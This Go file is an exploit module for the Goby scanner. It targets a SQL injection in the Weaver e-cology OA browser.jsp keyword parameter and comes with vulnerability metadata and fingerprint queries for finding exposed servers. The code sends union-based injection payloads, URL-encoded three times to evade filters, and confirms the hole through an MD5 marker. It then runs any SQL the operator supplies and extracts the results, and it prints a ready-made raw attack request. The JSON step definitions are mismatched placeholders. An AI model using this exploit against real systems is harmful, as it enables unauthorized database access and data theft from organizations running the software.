package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Weaver e-cology OA browser.jsp keyword SQL Injection Vulnerability",
    "Description": "<p>Weaver e-cology OA, also known as Ubiq Collaborative office system, is a high-quality office system built on the principle of simplicity, application and efficiency. The software has more than 20 functional modules including process, portal, knowledge, personnel and communication, and adopts intelligent voice interactive office mode, which can perfectly fit the actual needs of enterprises and open up the whole digital management for enterprises</p><p>The browser.jsp file has the s q l injection vulnerability, through which the attacker can obtain sensitive database information.</p>",
    "Product": "Weaver-OA",
    "Homepage": "https://www.weaver.com.cn/",
    "DisclosureDate": "2022-04-27",
    "Author": "1171373465@qq.com",
    "FofaQuery": "header=\"testBanCookie\" || banner=\"testBanCookie\" || body=\"/wui/common/css/w7OVFont.css\" || (body=\"typeof poppedWindow\" && body=\"client/jquery.client_wev8.js\") || body=\"/theme/ecology8/jquery/js/zDialog_wev8.js\" || body=\"ecology8/lang/weaver_lang_7_wev8.js\"",
    "GobyQuery": "header=\"testBanCookie\" || banner=\"testBanCookie\" || body=\"/wui/common/css/w7OVFont.css\" || (body=\"typeof poppedWindow\" && body=\"client/jquery.client_wev8.js\") || body=\"/theme/ecology8/jquery/js/zDialog_wev8.js\" || body=\"ecology8/lang/weaver_lang_7_wev8.js\"",
    "Level": "3",
    "Impact": "<p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.weaver.com.cn/\">https://www.weaver.com.cn/</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "sql,sqlPoint",
            "show": ""
        },
        {
            "name": "sql",
            "type": "input",
            "value": "select @@version",
            "show": "attackType=sql"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.8",
    "Translation": {
        "CN": {
            "Name": "泛微-协同办公 OA browser.jsp 文件 keyword 参数 SQL 注入漏洞",
            "Product": "泛微-协同办公OA",
            "Description": "<p>泛微OA办公系统也称为泛微协同办公系统，是一款以简单、适用、高效为原则打造的优质OA办公系统，该软件内置流程、门户、知识、人事、沟通的20多个功能模块，并采用智能语音交互办公模式，能够完美贴合企业实际需求，为企业打通全程数字化管理。</p><p>其中 browser.jsp 文件存在SQL注入漏洞，攻击者通过漏洞可以获取数据库敏感信息。</p>",
            "Recommendation": "<p>厂商已发布漏洞修复程序，请及时关注更新：<a href=\"https://www.weaver.com.cn\">https://www.weaver.com.cn</a></p>",
            "Impact": "<p>攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。</p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Weaver e-cology OA browser.jsp keyword SQL Injection Vulnerability",
            "Product": "Weaver-OA",
            "Description": "<p>Weaver e-cology OA, also known as Ubiq Collaborative office system, is a high-quality office system built on the principle of simplicity, application and efficiency. The software has more than 20 functional modules including process, portal, knowledge, personnel and communication, and adopts intelligent voice interactive office mode, which can perfectly fit the actual needs of enterprises and open up the whole digital management for enterprises</p><p>The browser.jsp file has the s q l injection vulnerability, through which the attacker can obtain sensitive database information.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:&nbsp;<a href=\"https://www.weaver.com.cn/\">https://www.weaver.com.cn/</a><br></p>",
            "Impact": "<p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-08-02",
    "PocId": "10812"
}`

	encodeData := func(sql string) string {
		// url.QueryEscape，他只会编码特殊字符的部分，正常的字母不会被url编码，所以下面代码的含义是进行了三次url编码
		encodedStr1 := ""
		encodedStr2 := ""
		encodedStr3 := ""
		for _, ch := range sql {
			encodedStr1 += fmt.Sprintf("%%%x", ch)
		}
		for _, ch := range encodedStr1 {
			encodedStr2 += fmt.Sprintf("%%%x", ch)
		}
		for _, ch := range encodedStr2 {
			encodedStr3 += fmt.Sprintf("%%%x", ch)
		}
		return encodedStr3
	}
	// 用正则匹配去掉脏数据
	getRegexp := func(body string) string {
		// 编译正则表达式
		reg, err := regexp.Compile(`"result":\[(.*?)],"baseSql"`)
		if err != nil {
			fmt.Println(err)
		}
		// 查找所有匹配的结果
		matches := reg.FindAllStringSubmatch(body, -1)
		// 创建一个空切片用于存储链接
		links := make([]string, 0, len(matches))
		// 遍历匹配结果，将链接添加到切片中
		for _, match := range matches {
			links = append(links, match[1])
		}
		// 返回切片
		return strings.Join(links, "")
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			sql := "1' union select 1,(select sys.fn_sqlvarbasetostr(HashBytes('MD5','123456'))) union select 1,'1"
			uri := "/mobile/%20/plugin/browser.jsp?isDis=1&browserTypeId=269&keyword=" + encodeData(sql)
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-type", "application/x-www-form-urlencoded")
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				return resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "0xe10adc3949ba59abbe56e057f20f883e")
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			if ss.Params["attackType"] == "sql" {
				sql := ss.Params["sql"].(string)
				sqlEncode := "1' union select 1,(" + sql + ") union select 1,'1"
				uri := "/mobile/%20/plugin/browser.jsp?isDis=1&browserTypeId=269&keyword=" + encodeData(sqlEncode)
				cfg := httpclient.NewGetRequestConfig(uri)
				cfg.VerifyTls = false
				cfg.FollowRedirect = false
				cfg.Header.Store("Content-type", "application/x-www-form-urlencoded")
				if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
					if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "\"result\":[{\"show2\":\"\",\"show1\"") {
						expResult.Output = getRegexp(resp.Utf8Html)
						expResult.Success = true
					}
				}
			} else if ss.Params["attackType"] == "sqlPoint" {
				expResult.Success = true
				expResult.Output = ` payload 要先将特殊字符，比如逗号，进行url编码。然后再对payload进行三次url编码（通过16进制）
GET /mobile/%20/plugin/browser.jsp?isDis=1&browserTypeId=269&keyword=%25%32%35%25%33%33%25%33%31%25%32%35%25%33%32%25%33%37%25%32%35%25%33%32%25%33%30%25%32%35%25%33%37%25%33%35%25%32%35%25%33%36%25%36%35%25%32%35%25%33%36%25%33%39%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%35%25%32%35%25%33%32%25%33%30%25%32%35%25%33%37%25%33%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33%36%25%36%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33%36%25%33%33%25%32%35%25%33%37%25%33%34%25%32%35%25%33%32%25%33%30%25%32%35%25%33%33%25%33%31%25%32%35%25%33%32%25%36%33%25%32%35%25%33%32%25%33%38%25%32%35%25%33%37%25%33%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33%36%25%36%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33%36%25%33%33%25%32%35%25%33%37%25%33%34%25%32%35%25%33%32%25%33%30%25%32%35%25%33%34%25%33%30%25%32%35%25%33%34%25%33%30%25%32%35%25%33%35%25%33%36%25%32%35%25%33%34%25%33%35%25%32%35%25%33%35%25%33%32%25%32%35%25%33%35%25%33%33%25%32%35%25%33%34%25%33%39%25%32%35%25%33%34%25%36%36%25%32%35%25%33%34%25%36%35%25%32%35%25%33%32%25%33%39%25%32%35%25%33%32%25%33%30%25%32%35%25%33%37%25%33%35%25%32%35%25%33%36%25%36%35%25%32%35%25%33%36%25%33%39%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%35%25%32%35%25%33%32%25%33%30%25%32%35%25%33%37%25%33%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33%36%25%36%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33%36%25%33%33%25%32%35%25%33%37%25%33%34%25%32%35%25%33%32%25%33%30%25%32%35%25%33%33%25%33%31%25%32%35%25%33%32%25%36%33%25%32%35%25%33%32%25%33%37%25%32%35%25%33%33%25%33%31 HTTP/1.1
Host: ` + expResult.HostInfo.HostInfo + `
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Connection: close`

			}
			return expResult
		},
	))
}
